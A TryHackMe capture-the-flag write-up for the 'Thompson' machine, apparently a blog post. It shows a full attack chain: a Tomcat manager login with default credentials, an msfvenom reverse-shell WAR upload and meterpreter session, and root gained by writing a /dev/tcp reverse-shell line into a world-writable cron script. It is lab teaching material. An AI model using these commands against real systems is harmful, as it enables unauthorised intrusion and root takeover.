---
title: Thompson WriteUp | TryHackMe
tags:
- ''
- ctf
- tryhackme
- apache
- tomcat
- cybersecurity
- linux
- cronjob
description: boot2root machine for FIT and bsides guatemala CTF
post-image: https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/thm-writeup-thompson.jpg
---

# Thompson Writeup - TryHackMe

Thompson - boot2root machine for FIT and bsides guatemala CTF.

## 1. Port Scan

First, let's start with port scanning using nmap. I initially targeted the most used 1000 ports:

``` bash
┌──(0xcyb3rw0lf㉿0xcyb3rw0lf)-[~/Desktop/THM/Thompson]
└─$ nmap -sS -vv 10.10.233.193
Host is up, received echo-reply ttl 60 (0.23s latency).
Scanned at 2024-07-11 08:40:02 EDT for 3s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 60
8009/tcp open  ajp13      syn-ack ttl 60
8080/tcp open  http-proxy syn-ack ttl 60
```

I proceeded later with a `full tcp scan`, however, no new ports showed up!

## 2. Enumeration

After that, I did a service detection using (`-sV`):

``` bash
┌──(0xcyb3rw0lf㉿0xcyb3rw0lf)-[~/Desktop/THM/Thompson]
└─$ nmap -sS -vv -p 22,8080,8009 -sV -oN serviceScan 10.10.233.193
Host is up, received timestamp-reply ttl 60 (0.20s latency).
Scanned at 2024-07-11 08:42:11 EDT for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   syn-ack ttl 60 Apache Jserv (Protocol v1.3)
8080/tcp open  http    syn-ack ttl 60 Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see from the SSH banner that the target is using `Ubuntu Linux` OS.

From there, I visited the web server at port `8080`, and found the default page for Apache Tomcat.

![home page](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/image.png)

Then I visited the `manager` page, and it required authentication. When I clicked cancel, the `401 Unauthorized` page showed up, and it had some interesting information:

![manager app](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/image-1.png)

![401 Unauthorized page](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/image-2.png)

As you see, the page showed the default credentials for the manager, which are `tomcat:s3cret`. I tried to login with these credentials, and it worked! We could do some brute-forcing here with the known default credentials, but we don't need to do that now. [This page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)has a list of default credentials for Apache Tomcat. Besides, it will be a good reference later in this writeup.

![manager web page](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/image-3.png)

## 3. Exploitation - Getting a Foothold

Looking at the manager console, I found a section called `WAR file to deploy`. I did some research on how to exploit this, and I found many ways to do this, one of them is using a `Metasploit module` that can help us with this. The module is `exploit/multi/http/tomcat_mgr_upload`. More information about the different ways to do this can be found [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#rce).

I decided to do this using `msfvenom`, in which I generated a reverse shell `.war` file with the payload `java/jsp_shell_reverse_tcp`. The command I used is:

``` bash
┌──(0xcyb3rw0lf㉿0xcyb3rw0lf)-[~/Desktop/THM/Thompson]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.0.212 LPORT=1337 -f war > exploit.war                       
Payload size: 1108 bytes
Final size of war file: 1108 bytes
```

Then I went to `msfconsole` to run the listener:

``` bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LHOST 10.17.0.212
LHOST => 10.17.0.212
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > run
```

After that, I uploaded the `.war` file to the manager console. You will notice the file is uploaded and a path is added to the `Applications` section with the file name. All you need to do now is to visit the url of that application to get a reverse shell. You can do this using `curl` or form the web browser.

![exploit uploaded](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/thm-writeup-thompson/image-4.png)

``` bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.0.212:1337 
[*] Command shell session 1 opened (10.17.0.212:1337 -> 10.10.202.226:44388) at 2024-07-11 10:00:10 -0400
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
^Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type              Information  Connection
  --  ----  ----              -----------  ----------
  1         shell java/linux               10.17.0.212:1337 -> 10.10.202.226:44388 (10.10.202.226)
```

Then I upgraded the session to a meterpreter session:

``` bash
msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.17.0.212:4433 
[*] Sending stage (1017704 bytes) to 10.10.202.226
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.17.0.212:4433 -> 10.10.202.226:39476) at 2024-07-11 10:01:48 -0400

[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         shell java/linux                               10.17.0.212:1337 -> 10.10.202.226:44388 (10.10.202.226)
  2         meterpreter x86/linux  tomcat @ 10.10.202.226  10.17.0.212:4433 -> 10.10.202.226:39476 (10.10.202.226)

msf6 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: tomcat
meterpreter > sysinfo
Computer     : 10.10.202.226
OS           : Ubuntu 16.04 (Linux 4.4.0-159-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 905 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (659): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ubuntu:/$ 
```

After that we can grab the user flag:

``` bash
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
[REDACTED]
```

## 4. Privilege Escalation

Proceeding with privilege escalation, I checked the cron jobs on the system:

``` bash
tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
#
```

I found a script called `id.sh` which runs with `root` permissions all the time! I found this file in the `/home/jack` directory and `jack` has read, write, and execute permissions!

``` bash
tomcat@ubuntu:/home/jack$ ls -lah
ls -lah
total 48K
drwxr-xr-x 4 jack jack 4.0K Aug 23  2019 .
drwxr-xr-x 3 root root 4.0K Aug 14  2019 ..

...

-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root   39 Jul 11 07:04 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
```

After viewing `id.sh`, I found that it pipes the output of `id` command to a file called `test.txt` in the same directory (with root permissions of course).

I can write to this file, and get a reverse shell as root!

``` bash
tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.17.0.212/6666 0>&1" > id.sh                          
<cho "bash -i >& /dev/tcp/10.17.0.212/6666 0>&1" > id.sh                     
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
bash -i >& /dev/tcp/10.17.0.212/6666 0>&1
tomcat@ubuntu:/home/jack$ 
```

Then I started a listener on my machine using `nc`, I was able to get a connection:

``` bash
┌──(kali㉿kali)-[~/Desktop/THM/Thompson]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.17.0.212] from (UNKNOWN) [10.10.202.226] 54036
bash: cannot set terminal process group (17945): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# id
id
uid=0(root) gid=0(root) groups=0(root)
```

From there, we can grab the root flag:

``` bash
root@ubuntu:~# cat root.txt
cat root.txt
[REDACTED]
```

## References

1. [Tomcat | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
